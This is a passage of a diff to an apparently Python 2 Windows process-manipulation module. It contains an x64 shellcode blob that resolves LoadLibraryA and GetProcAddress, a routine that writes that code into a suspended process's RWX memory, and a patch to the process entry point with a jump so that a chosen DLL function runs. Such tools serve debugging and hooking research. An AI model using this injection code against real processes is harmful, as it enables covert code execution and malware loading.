+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x46\x75\x6e\x63\x74\x69\x6f\x6e\x73"\
+"\x48\x6f\x6f\x6b\x65\x64\x00\x00\x00\x00\x00\x9c\x50\x55\x53\x51\x52\x57\x56\x41"\
+"\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x48\x8b\x84\x24\x80"\
+"\x00\x00\x00\x48\x83\xec\x28\x48\x83\xe4\xf0\x48\x25\x00\x00\xff\xff\x4c\x8b\x38"\
+"\x41\x81\xff\x4d\x5a\x90\x00\x74\x08\x48\x2d\x00\x00\x01\x00\xeb\xec\x49\x89\xc7"\
+"\x48\x8d\x1d\xa0\xff\xff\xff\x48\x8d\x3d\x7a\x01\x00\x00\x48\x89\xc1\x48\x63\x40"\
+"\x3c\x4c\x01\xf8\x48\x63\x80\x88\x00\x00\x00\x48\x01\xc1\x44\x8b\x41\x1c\x4d\x01"\
+"\xf8\x48\x63\x51\x18\x44\x8b\x49\x24\x4d\x01\xf9\x44\x8b\x59\x20\x4d\x01\xfb\x48"\
+"\x31\xed\x41\x8b\x34\xab\x4c\x01\xfe\x49\x89\xfc\x48\x8d\x0d\x48\x01\x00\x00\x48"\
+"\x29\xf9\xf3\xa6\x4c\x89\xe7\x74\x05\x48\xff\xc5\xeb\xe0\x48\x31\xff\x66\x41\x8b"\
+"\x3c\x69\x41\x8b\x0c\xb8\x4c\x01\xf9\x49\x89\xcd\x48\x8d\x15\x20\x01\x00\x00\x4c"\
+"\x89\xf9\x41\xff\xd5\x49\x89\xc6\x48\x8d\x0d\x0e\xfd\xff\xff\x41\xff\xd6\x48\x8d"\
+"\x15\x0d\xfe\xff\xff\x48\x89\xc1\x41\xff\xd5\xff\xd0\x48\x8d\x15\x04\x01\x00\x00"\
+"\x4c\x89\xf9\x41\xff\xd5\x48\x89\x05\x25\x01\x00\x00\x48\x8d\x15\xff\x00\x00\x00"\
+"\x4c\x89\xf9\x41\xff\xd5\x48\x89\x05\x19\x01\x00\x00\x48\x8d\x15\xff\x00\x00\x00"\
+"\x4c\x89\xf9\x41\xff\xd5\x48\x89\x05\x0d\x01\x00\x00\x4c\x8d\x05\xcb\xfe\xff\xff"\
+"\x48\xc7\xc2\x00\x00\x00\x00\x48\xc7\xc1\x03\x00\x1f\x00\xff\x15\xf2\x00\x00\x00"\
+"\x48\xba\xff\xff\xff\xff\x00\x00\x00\x00\x48\x89\xc1\xff\x15\xd7\x00\x00\x00\x4c"\
+"\x8d\x0d\xad\xfe\xff\xff\x49\xc7\xc0\x40\x00\x00\x00\x48\x8b\x15\x4d\xfc\xff\xff"\
+"\x48\x8b\x0d\x3e\xfc\xff\xff\xff\x15\xad\x00\x00\x00\x48\x8b\x0d\x39\xfc\xff\xff"\
+"\x48\x8d\x35\x3a\xfc\xff\xff\x48\x8b\x3d\x23\xfc\xff\xff\xf3\xa4\x4c\x8d\x0d\x74"\
+"\xfe\xff\xff\x44\x8b\x05\x6d\xfe\xff\xff\x48\x8b\x15\x14\xfc\xff\xff\x48\x8b\x0d"\
+"\x05\xfc\xff\xff\xff\x15\x74\x00\x00\x00\x48\x83\xc4\x28\xff\x35\xf5\xfb\xff\xff"\
+"\x58\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59\x41\x58\x5e\x5f\x5a"\
+"\x59\x5b\x5d\x58\x9d\xff\xa4\x24\x78\xff\xff\xff\x47\x65\x74\x50\x72\x6f\x63\x41"\
+"\x64\x64\x72\x65\x73\x73\x00\x4c\x6f\x61\x64\x4c\x69\x62\x72\x61\x72\x79\x41\x00"\
+"\x56\x69\x72\x74\x75\x61\x6c\x50\x72\x6f\x74\x65\x63\x74\x00\x57\x61\x69\x74\x46"\
+"\x6f\x72\x53\x69\x6e\x67\x6c\x65\x4f\x62\x6a\x65\x63\x74\x00\x4f\x70\x65\x6e\x45"\
+"\x76\x65\x6e\x74\x41\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"\
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+         
+        try:
+            #start preparing code for injection
+            entry_point = self.GetProcessEntryPoint()
+            is32bit = self.is32BitProcess()
+             
+            jmp_instruction_size = 5
+             
+            #for both 32 and 64bit versions
+            ep_addr_offset = 5
+             
+            code = inject_code64
+            lib_name_offset = 0x3d
+            func_name_offset = 0x146
+            num_bytes_offset = 0xd
+            missing_bytes_offset = 0x15
+            k32dll_baseaddr_offset = 0x28d
+            code_len = len(code)
+             
+            if is32bit:
+                code = inject_code32
+                lib_name_offset = 0x35
+                func_name_offset = 0x13e
+                num_bytes_offset = 0x9
+                missing_bytes_offset = 0xd
+                k32dll_baseaddr_offset = 0x28d #change offset to suit to get 32bit going
+                code_len = len(code)
+ 
+            desired_alloc_addr = c_void_p(self.GetProcessBaseAddr() - code_len)
+            desired_alloc_addr = desired_alloc_addr.value & 0xFFFFFFFFFFF00000
+            code_address = VirtualAllocEx(self.handle, desired_alloc_addr,  code_len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+             
+            #Calculate the jmp opcodes
+            #destination - (current address + jmp instruction size)
+            jmp32 = '\xe9'
+            jmp_addr = c_ulong(code_address - (entry_point + jmp_instruction_size))
+ 
+            jmp_addr = struct.pack('L',  jmp_addr.value)
+            jmp32 = jmp32 + jmp_addr[:]
+                 
+            bytes_read = c_size_t(0)
+            epbytes_buffer = create_string_buffer(len(jmp32))
+ 
+            #save the bytes from the process entry_point
+            if not xxxReadProcessMemory(self.handle, entry_point, byref(epbytes_buffer),  len(jmp32),  byref(bytes_read)):
+                    raise Exception("Couldn't read process memory")
+             
+            #stamp in lib name into the remote code
+            code = code[0:lib_name_offset] + lib_name + code[lib_name_offset + len(lib_name):]
+             
+            #stamp in function to call in the remote lib
+            code = code[0:func_name_offset] + func_name + code[func_name_offset + len(func_name):]
+             
+            #stamp in number of bytes to replace at entry point
+            num_bytes = struct.pack('L',  len(jmp32))
+            code = code[0:num_bytes_offset] + num_bytes[:] + code[num_bytes_offset + len(num_bytes):]
+             
+            #stamp in missing bytes to replace at entry point
+            missing_bytes = epbytes_buffer.value
+            code = code[0:missing_bytes_offset] + missing_bytes[:] + code[missing_bytes_offset + len(missing_bytes):]
+ 
+            if is32bit:
+                ep_addr = struct.pack('L',  entry_point)
+            else:
+                ep_addr = struct.pack('Q',  entry_point)
+                #k32dll_baseaddr_offset 
+                #k32dll_addr = xxxGetModuleHandleW()
+                remote_k32dll_addr = struct.pack('Q',  xxxGetModuleHandleW("kernel32.dll"))
+                 
+            code = code[0:ep_addr_offset] + ep_addr + code[ep_addr_offset + len(ep_addr):]
+             
+            #only needed if stamping kernel32 address in.
+            #code = code[0:k32dll_baseaddr_offset ] + remote_k32dll_addr + code[k32dll_baseaddr_offset  + len(remote_k32dll_addr):]
+ 
+            written = c_size_t(0)
+            len(ep_addr)
+             
+            xxxWriteProcessMemory(self.handle, code_address, code, code_len,  byref(written))
+            xxxWriteProcessMemory(self.handle, entry_point, jmp32, len(jmp32),  byref(written))
+         
+        except Exception, e: 
+            raise Exception("Process.InjectSuspendedProcess: Couldn't inject code; %s\n" % str(e))
+         
+         
+#related utility functions
+ 
+def CreateProcessSuspended(file_name,  cmd_line = None):
+    pi = CreateProcessW(file_name,  cmd_line,  None,  None,  False,  CREATE_SUSPENDED,  None,  None,  None)
+    print pi.dwProcessId
+    return Process(pi.dwProcessId,  pi)
+     
+def GetProcessList():
+    pass
+ 
+def is32BitExecutableImage(file_name):
+    """Determine whether or not this executable image is 32bit or 64bit
+     
+     
+    Takes the path+filename of the executable or module in question"""
+     
+    try:
+        if file_name != None:
+            import pefile
+            pe =  pefile.PE(file_name, fast_load=True)
+            imagetype = pe.FILE_HEADER.Machine
+            if imagetype == 0x8664:
+                return False
+            if imagetype == 0x14c:
+                return True
+            raise Exception("Image type 0x%x" % imagetype)
+             
+    except Exception, e:
+        raise Exception("Process.is32BitProcess: Image type was not x86 or x64 - %s\n" % str(e))
